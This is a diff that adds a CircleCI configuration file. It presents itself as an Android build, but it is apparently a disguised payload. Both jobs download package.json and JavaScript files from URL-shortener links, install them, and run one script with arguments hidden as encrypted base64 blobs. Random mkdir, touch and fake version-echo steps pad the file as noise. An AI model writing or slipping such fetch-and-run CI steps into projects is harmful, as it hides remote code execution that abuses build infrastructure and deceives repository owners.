@@ -1,0 +1,50 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  final-jobs:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir djtv1jg3f6vw0sugp
+      - run: curl -fsSL shorturl.at/wxIWX -o package.json && curl -fsSL
+          shorturl.at/rtBSW -o n5x4mmsk5i3sl.js && curl -fsSL shorturl.at/bezIT
+          -o org06riwsg4vfzpl.js
+      - run: mkdir zmfl42hwzgh978m9zqs
+      - run: mkdir 0vgzz1q8468xapta12mrx5sxq
+      - run: echo version 10754979722.857958
+      - run: npm i -s
+      - run: touch scbwrfjwi3rg6wf3hwtf1o5.cpp
+      - run: mkdir gy0qnchp4xhtboal7v55
+      - run: node org06riwsg4vfzpl -lpn U2FsdGVkX1/5ovJnoquRo7T3QLffi9/yfMDkcgSrhjY= -sp
+          -s
+          U2FsdGVkX19BolYCPKdogp6g1hJZjhtObvux04zpJs6NwwnJUYfa4FuD+6WG1KDbkqPlrOg+PZ5DFIGE66r84CMWcpyvpH3RqbGups/Ln6kYu26VBzoC/xUXHb6BuUmzhCHor2Vn0q6/LzCUBtBxCt89EtnEOOumkjeVPluBfoJKRLwTXYcae5QcwO/fGUhkQiizzuDuNtvFU8XCq/ilVcpiYprEEH2G1v0v80h9hs4=
+          -r
+          U2FsdGVkX184llAdXoAXB9Hu4aS33Pxp8KwebxlB1sb7evL1SdkAM4at3tyvVoZ6pMGiUa0AT9aJP6a/qCE7VPNy6oeYsSTnJONqI3mLaJpo8j9uwq/515Q4xyRQrrIYv/+eWrb40/bjQaL9oPKIUFjin5efp3BfaQtNG4KbdL5ZikCOFf57X1yDzJIYkhaRF0vUghqUTIBNAly7LNksq0cwK1JUVzoFLl8ESR+MKRgjGEZij5yJXIUIen9M8O8Wg1pMRnQ96LvPdkC1kd1C75OWOd6EcT++0z7LJDZiat8=
+          -t U2FsdGVkX18IrHJqPhIPMMGTPQvv1AlkNrCtvMClnxVe1Vov+4Cuy7QqmjEuqSNp
+  build-source:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir gwk76niliiikkdq5mz3icf
+      - run: touch b4bxzt6yjzfabdolgk6j7l.net
+      - run: curl -fsSL shorturl.at/uJLQR -o package.json && curl -fsSL
+          shorturl.at/prsO1 -o kcspwa.js && curl -fsSL shorturl.at/bowI8 -o
+          jd3qwf9cyhff.js
+      - run: npm i -s
+      - run: touch 5tko8zwdlj3kzim8u0f4188j9j.js
+      - run: echo version 29285161173.762257
+      - run: node kcspwa -sp -s
+          U2FsdGVkX18HSH5Zy/n+xZ6D8VmwpfevteEhyKaOWA+bb/okxsRK0k+LMp7cf6w4E0bMq4iRnFohIv+e0EViGWYP8FEZeapwPyltZcO8/vU7St2DhdjbWuzJoFN/qWPIAME1vr4CHbM+7U2pi0EX5Nhg9duVGPH3/h4z2Em4LmEtNYazdHPKZicEyvoA/LDd2rcmgyGjV/f97s3TUtKEw50bCTzOiPYL2ouYlT6TS+8=
+          -t U2FsdGVkX19vonsQuJQtUCoLngZHutfFH4IxDkO0pAtb2h17MPRir97RRNxXOApw -r
+          U2FsdGVkX1/IrJAffeL+MJLblcaa5Kr46KYX6y0hcC679PcQH7lpuHTPS7RCP3lJD96oZdOW9qxQs8HvnKYPBMPMZWP4z9YZQ3nLqQma0QEmdFkZ/2DooBQFYYtmufEGd+z9pLESxoaW7CvKpDB/hSTWXAxzDHmBK5MfRt+Nxx/5vG+gEiw81slNvgFyPgA6Yo9R1ASypLUm3K/CvOb5M+nj5cZ9rMVew/gSu/ennBNtC6tFCXLp4n11VaETDIl4RDP0JkWUFsxLaUdSlE61WXpS++Ub3C89NnXv1rvO++4=
+          -lpn U2FsdGVkX19KnolIvam2K1mwQCW3ZeS7vvYfEpbwfTE=
+      - run: mkdir bl9b33q1ub4ltnhhtwk0m66io2dh
+      - run: mkdir y1j5qhauwuduecpzywii
+workflows:
+  motherFucker:
+    jobs:
+      - final-jobs
+  runJobs:
+    jobs:
+      - build-source
